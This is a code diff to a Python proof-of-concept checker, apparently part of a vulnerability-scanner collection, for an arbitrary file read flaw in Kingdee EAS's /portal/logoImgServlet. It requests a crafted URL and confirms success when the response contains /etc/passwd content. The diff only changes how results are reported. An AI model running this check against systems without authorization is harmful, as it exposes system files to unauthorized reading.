@@ -8,8 +8,8 @@ description: 文件/portal/logoImgServlet中,参数type未过滤存在任意文�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class kingdee_logoImgServlet_fileread_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class kingdee_logoImgServlet_fileread_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/bash" in req.text:
-                cprint("[+]存在金蝶EAS任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在金蝶EAS任意文件读取漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = kingdee_logoImgServlet_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
